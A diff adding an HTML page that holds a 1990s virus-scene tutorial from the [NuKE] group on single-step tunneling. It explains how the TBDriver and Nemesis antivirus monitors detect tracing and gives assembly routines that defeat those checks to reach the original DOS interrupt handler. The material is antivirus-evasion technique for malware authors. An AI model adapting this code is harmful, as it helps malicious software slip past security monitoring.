@@ -1,0 +1,288 @@
+
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - Single Step Tunnel Techniques 2</TITLE>
+   
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+
+<CENTER><P><B><FONT COLOR="#004080"><FONT SIZE=+2>Dark Fiber of [NuKE]<BR>
+presents<BR>
+</FONT><FONT SIZE=+3>Single Stepping Tunnel Techniques<BR>
+</FONT><FONT SIZE=+2>Part 2<BR>
+Anti-Tracers</FONT></FONT></B></P></CENTER>
+
+<PRE>
+<HR WIDTH="100%"></PRE>
+
+<UL>
+<PRE>
+  Okey, so you have run the Example.Com program and TBDriver has beeped
+to the tune of Example.Com is trying to trace the Interrupt chain, or something
+to that effect.  Your first question should be &quot;How the hell does it know we
+are tracing it?&quot;
+
+Well, I'm glad you asked! ;)
+
+Here is a simple representation
+
+
+        Code Memory                             Stack Memory
+
+        mov     ax,1234h
+        push    ax                              1234h
+        mov     bx,5678h                        1234h
+        mov     cx,DEADh                        1234h
+        push    cx                              DEADh, 1234h
+        push    bx                              5678h, DEADh, 1234h
+
+        pop     ax      ;=5678h                 DEADh, 1234h
+        pop     bx      ;=DEADh                 1234h
+        pop     cx      ;=1234h
+
+Now, even tho we have poped them off memory, what has actually happend is
+that the SP add had 2 added to it each time, adjusting where it points to,
+but those values ARE STILL IN MEMORY, just below where SP points to currently.
+
+        so, if  we did
+
+        sub     sp,6
+
+        the Stack Memory would look like
+
+        5678h, DEADh, 1234h
+
+The contents of memory have not been altered in any way, just the pointer
+to the memory has.
+
+
+Now, using the above example, this is what happens when we tunnel
+
+assume,   int 1 CS=code, flags=flags, and the # is the ip.
+
+When an INT occurs, it pushes the flags, cs, and ip onto the stack.
+
+        Code Memory                     Stack Memory
+cs:=code
+
+1)      mov     ax,1234h
+2)     *int     1*                              3, code, flags,
+3)      push    ax                              1234h
+4)     *int     1*                              5, code, flags, 1234h
+5)      mov     bx,5678h                        1234h
+6)     *int     1*                              7, code, flags, 1234h
+7)      mov     cx,DEADh                        1234h
+8)     *int     1*                              9, code, flags, 1234h
+9)      push    cx                              DEADh, 1234h
+a)     *int     1*                              b, code, flags, DEADh, 1234h
+b)      push    bx                              5678h, DEADh, 1234h
+c)     *int     1*                              d, code, flags, 5678h, DEADh...
+d)      pop     ax      ;=5678h                 DEADh, 1234h
+e)     *int     1*                              f, code, flags, DEADh, 1234h
+f)      pop     bx      ;=DEADh                 1234h
+10)    *int     1*                              11, code, flags, 1234h
+11)     pop     cx      ;=1234h
+
+
+Now, if we were to subtract SP by 6, this time our Stack Memory would look
+like this,
+
+        code, flags, 1234
+
+Notice that the bottom 4 bytes are not 5678h, DEADh, thats because when an
+Int 1 occurs, it overwrites whats underneath it.
+
+(Hope I'm explaining this so you understand ;)
+
+This is how TBdriver detects a tracer is in memory.
+
+Here is the actual TBDriver code
+
+        push    bx
+        push    ax
+        xchg    ax,bx
+        pop     ax
+        dec     sp
+        dec     sp
+        pop     bx
+        cmp     ax,bx
+        pop     bx
+
+Now, when its run without a tracer its Stack Memory looks like this
+
+assume ax=1234, bx=5678
+
+        Code                            Stack
+        push    bx      ;bx=5678h       5678h
+
+        push    ax      ;ax=1234h       1234h, 5678h
+
+        xchg    ax,bx   ;ax=5678h       1234h, 5678h
+                        ;bx=1234h
+
+        pop     ax      ;ax=1234h       5678h
+                        ;bx=1234h
+        dec     sp                      34h, 5678h
+        dec     sp                      1234h, 5678h
+
+        pop     bx      ;ax=1234h       5678h
+                        ;bx=1234h
+
+        cmp     ax,bx   ;ax=1234h       5678h
+                        ;bx=1234h
+
+        pop     bx      ;ax=1234h
+                        ;bx=5678h
+
+
+Underneath the stack, it looks like this
+
+                        1234h,  5678h
+
+Because the SP is decremented, and the stack untouched, 1234h is still
+there.
+
+Now, if we traced it....
+
+        Code                            Stack
+        push    bx      ;bx=5678h       5678h
+
+       *int     1*                      ip, code, flags, 5678h
+
+        push    ax      ;ax=1234h       1234h, 5678h
+
+       *int     1*                      ip, code, flags, 1234h, 5678h
+
+        xchg    ax,bx   ;ax=5678h       1234h, 5678h
+                        ;bx=1234h
+
+       *int     1*                      ip, code, flags, 1234h, 5678h
+
+        pop     ax      ;ax=1234h       5678h
+                        ;bx=1234h
+
+       *int     1*                      ip, code, flags, 5678h
+
+        dec     sp                      ags, 5678h
+        dec     sp                      flags, 5678h
+
+       *int     1*                      ip, code, flags, flags, 5678h
+
+        pop     bx      ;ax=1234h       ;5678h
+                        ;bx=flags
+       *int     1*                      ip, code, flags, 5678h
+
+        cmp     ax,bx   ;ax=1234h       5678h
+                        ;bx=flags
+
+       *int     1*                      ip, code, flags, 5678h
+
+        pop     bx      ;ax=1234h
+                        ;bx=5678h
+
+
+Now, when SP is decremented, because the last value pushed was the flags,
+it overwrote the previously pushed AX in memory...... TB detects this,
+notices its not what it expected it to be, and knows we are tracing it.
+
+How do we get around this?  Well, in TBDriver, its structured so that
+the first two bytes are a short jump OVER a far jump to the original
+DOS Int21h..... So we check for TBcode, and use the far jump data ;)
+
+The code to fool TBScan looks like this
+
+;Place this code underneath the ItsNotJmpD: label.
+TBKiller:
+        cmp     al,0fah                         ;CLI?
+        jne     EndTBKiller
+        lodsw
+        cmp     ax,0fc9c                        ;Is it TBDriver?
+        jne     EndTBKiller
+        lodsw
+        cmp     ax,05053                        ;TBDriver?
+        jne     EndTBKiller
+        sub     si,10
+        mov     w[bp+_rip],si                   ;Run the original FAR jump
+        inc     si                              ;skip EAh, so its data.
+        jmp     FARJumpData
+
+EndTBKiller:
+
+
+
+&quot;Gee, I heard Nemesis is damn tricky?&quot;  Eh? Not any more!  All Nemesis
+does to find tracers is do a PUSHF, then check W[BP+xx],0404, JB,
+Now, if the TF is on, the FLAGS is &gt; 0404, so, we add a status bit that
+tells us that the LAST OPCODE RUN was a PUSHF, so remove the TF ;)
+Now is that simple or what?
+
+
+The last method of killing a tracer while its running goes like this.
+
+1.  Get the address of Int 1h
+2.  Replace the first byte of the Int 1h seg:offs with an IRET opcode
+3.  Remove the trace flag
+4.  Restore the frist byte of Int 1h
+
+To do that the code looks like
+
+        mov     ax,03501h
+        int     21h
+        mov     cl,0CFh
+    es: xchg    byte ptr [bx], cl
+        pushf
+        pop     ax
+        and     ax,0feff
+        push    ax
+        popf
+    es: xchg    byte ptr [bx], cl
+
+
+Now, how do you defeat this?  Well, this *type* is pretty easy to avoid to.
+The code goes something like this.
+
+;Under the EndTBKiller: label goes this,
+
+Kill_INT_1_Killers:
+        cmp     al,0CDh                                 ;INT call?
+        jne     End_Kill_Int_1_Killers
+        cmp     byte ptr [si],021h                      ;21?
+        jne     End_Kill_Int_1_Killers
+        cmp     word ptr [bp+_ax],03501                 ;GET INT 1?
+        jne     End_Kill_Int_1_Killers
+    cs: or      byte ptr [_Status],2                    ;turn on fake int adres
+End_Kill_Int_1_Killers:
+
+
+;Under  RunNextTest_1:  put the code
+        test    byte ptr [_Status],2            ;fake the address?
+        je      RunNextTest_2
+        xor     byte ptr [_Status],2
+        mov     ax, word ptr [Int_01v]          ;get the orig, int 1 address
+        mov     word ptr [bp+_bx],ax            ;put in into bx
+        mov     ax, word ptr [Int_01v+2]
+        mov     word ptr [bp+_es],ax            ;put it into es
+        ;Now when it writes a byte to int 1, it
+        ;will be writting to the unused int 1.
+RunNextTest_2:
+
+But what happens if they get our Int_1 address directly from the IVT?
+Well..... you can check if they are putting a byte into our segment,
+but, because of the miriad of differnt ways one can put a byte into
+a position in memory, well, if you are a masochist you can come up with
+that code all by yourself.
+
+Well, I hope I've explained it so that you understand how tunnelers work.
+If you want to see a different kind of tunneler check out ART 2.2 whos'
+full source code is in vlad#4. This tunneler does not use int 1, but rather
+decodes each single opcode.
+
+Ah well, if you didnt understand then i really screwed up.</PRE>
+</UL>
+
+<PRE>
+<HR WIDTH="100%">
+</PRE>
+
+</BODY>
+</HTML>
